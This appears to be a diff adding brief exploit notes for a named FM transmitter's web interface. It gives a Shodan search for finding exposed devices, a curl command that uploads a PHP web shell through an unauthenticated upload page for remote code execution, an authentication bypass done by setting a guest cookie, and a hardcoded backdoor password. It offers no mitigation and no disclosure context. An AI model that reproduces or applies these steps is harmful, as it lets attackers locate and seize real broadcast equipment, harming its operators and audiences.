@@ -1,0 +1,20 @@
+https://www.dmbroadcaststore.com/product/mozart-fm-transmitter/
+
+shodan : title:"Remote Device Login"
+
+**** RCE via file upload ***
+
+/upload_file.php
+
+curl -F "file=@/tmp/shell.php" http://xxx/upload_file.php
+shell uploaded to http://xxx/upload/shell.php
+
+
+**** Auth bypasss as guest ****
+Set Cookie
+guest_en:1
+
+reload main.php
+
+**** Admin Web Backdoor ****
+Just loggin just any name except "guest" and "admin" and use "skdjfkjsdkfsakfsahdjksa" as password..
